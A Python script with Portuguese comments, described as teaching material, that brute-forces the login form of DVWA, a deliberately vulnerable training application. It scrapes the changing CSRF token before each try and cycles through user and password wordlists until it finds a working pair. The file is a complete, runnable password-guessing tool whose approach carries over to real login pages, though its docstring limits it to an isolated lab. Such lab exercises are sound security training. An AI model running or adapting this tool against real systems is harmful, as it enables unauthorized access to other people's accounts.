#!/usr/bin/env python3
"""
dvwa_bruteforce.py
-------------------
Script didático para automatizar tentativas de login no formulário do
DVWA (Damn Vulnerable Web Application), tratando o token CSRF
(`user_token`) dinâmico que o Medusa, por padrão, não resolve sozinho.

USO EXCLUSIVO EM AMBIENTE DE LABORATÓRIO ISOLADO, contra uma instância
DVWA que você mesmo controla. Não utilize contra sistemas de terceiros.

Dependências:
    pip install requests beautifulsoup4

Uso:
    python3 dvwa_bruteforce.py --target http://192.168.56.20/dvwa \
        --users wordlists/usuarios.txt --passwords wordlists/senhas.txt
"""

import argparse
import sys

import requests
from bs4 import BeautifulSoup


def get_login_token(session: requests.Session, login_url: str) -> str:
    """Obtém o user_token (CSRF) atual da página de login do DVWA."""
    resp = session.get(login_url, timeout=10)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "user_token"})
    if not token_input:
        raise RuntimeError("Não foi possível localizar o user_token na página de login.")
    return token_input["value"]


def try_login(session: requests.Session, login_url: str, user: str, password: str) -> bool:
    """Tenta um login e retorna True se tiver sucesso."""
    token = get_login_token(session, login_url)
    payload = {
        "username": user,
        "password": password,
        "Login": "Login",
        "user_token": token,
    }
    resp = session.post(login_url, data=payload, timeout=10, allow_redirects=True)
    # O DVWA redireciona para index.php e NÃO mostra "Login failed" em caso de sucesso
    return "Login failed" not in resp.text


def load_wordlist(path: str) -> list:
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]


def main():
    parser = argparse.ArgumentParser(description="Brute force didático no login do DVWA")
    parser.add_argument("--target", required=True, help="URL base do DVWA, ex: http://192.168.56.20/dvwa")
    parser.add_argument("--users", required=True, help="Caminho da wordlist de usuários")
    parser.add_argument("--passwords", required=True, help="Caminho da wordlist de senhas")
    parser.add_argument("--delay", type=float, default=0.5, help="Atraso entre tentativas (segundos)")
    args = parser.parse_args()

    login_url = args.target.rstrip("/") + "/login.php"
    users = load_wordlist(args.users)
    passwords = load_wordlist(args.passwords)

    print(f"[*] Alvo: {login_url}")
    print(f"[*] {len(users)} usuários x {len(passwords)} senhas = {len(users) * len(passwords)} tentativas\n")

    import time

    for user in users:
        for password in passwords:
            session = requests.Session()
            try:
                success = try_login(session, login_url, user, password)
            except Exception as exc:
                print(f"[!] Erro em {user}:{password} -> {exc}")
                continue

            if success:
                print(f"[+] SUCESSO: usuário='{user}' senha='{password}'")
                return
            else:
                print(f"[-] Falhou: usuário='{user}' senha='{password}'")
            time.sleep(args.delay)

    print("\n[*] Nenhuma credencial válida encontrada com as wordlists fornecidas.")


if __name__ == "__main__":
    sys.exit(main())
